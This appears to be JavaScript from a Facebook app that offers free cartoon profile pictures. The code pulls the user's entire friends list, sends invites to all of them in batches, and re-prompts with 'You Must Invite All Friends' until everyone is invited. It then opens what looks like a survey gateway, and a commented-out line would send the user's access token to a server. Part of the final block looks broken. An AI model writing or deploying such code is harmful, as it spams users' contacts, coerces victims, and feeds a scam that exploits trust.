



 window.fbAsyncInit = function() { 

 var curLoc = window.location; 

 FB.init({ 

 appId : '336953559728376', 

 xfbml : true, 

 oauth : true, 

 cookie: true 

 }); 

 FB.Canvas.setAutoGrow(); 

 }; 

 (function() { 

 var e = document.createElement('script'); e.async = true; 

 e.src = document.location.protocol + 

 '//connect.facebook.net/es_LA/all.js'; 

 document.getElementById('fb-root').appendChild(e); 

 }()); 



 function inviteFriends(message){ 

 FB.ui({ method: 'apprequests', 

 message: message, 

 data:"336953559728376" 

 }); 

 } 



 var davet_m="",davet_t="Suggest to Friends",kkk=0; 

 function mshuffle(o){ 

 for(var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x); 

 return o; 

 }; 

 function sendRequestToFriends(txxt,title){ 

 davet_m=txxt; 

 if (title) 

 davet_t=title; 

 FB.login(function(response) { 

 if (response.authResponse) { 

 if(!kkk) { 

 kkk=1; 

 //$.post("/justhtml/181411457193/email",{"token":response.authResponse.accessToken},function(data) {}); 

 }

 all(); 

 } 

 else { 

 all(); 

 } 

 }, {scope: 'user_location'},{display: 'popup'} ); 

 } 

 function all(){ 

 var friends = new Array(); 

 FB.api('/me/friends', function(response) { 

 for (var i=0; i<response.data.length; i++) { 

 //for (var i=0; i<100; i++) { 

 friends[i] = response.data[i].id; 

 //alert(friends[i]); 

 } 

 mshuffle(friends); 

 loop(friends); 

 }); 

 } 

 var GG_NUM=50; 

 function loop(list){ 

 if(list.length != 0){ 

 //alert(list.length); 

 var string = ''; 

 var shifting = 0; 

 if (list.length >= GG_NUM){ 

 shifting = GG_NUM;

 for (var j = 0; j< GG_NUM; j++){ 

 if (j != GG_NUM-1) 

 string = string + list[j] + ','; 

 else 

 string = string + list[j]; 

 } 

 } 

 else{ 

 shifting = list.length; 

 for (var j = 0; j< list.length; j++){ 

 if (j != list.length - 1) 

 string = string + list[j] + ','; 

 else 

 string = string + list[j]; 

 } 

 } 

 string = "'" + string + "'"; 

 FB.ui({method: 'apprequests', data: '254333748009423', message: davet_m, title: davet_t, to : string}, 

 function(response) { 

 if (response) { 

 for (var i = 0; i < shifting; i++){ 

 list.shift(); 

 } 

 if(list.length != 0){ 

 loop(list); 

 } 

 else 

 { 

 (function() { 

		   startGateway('135514');


 document.getElementById('fb-roott').appendChild(e); 

 }()); 

 } 

 } 

 else{ 
 alert("You Must Invite All Friends To Cartoonise for FREE!!");sendRequestToFriends('Cartoonise Your Profile Picture','Invite Your Friends Now');

 } 

 }); 

 } 

 } 

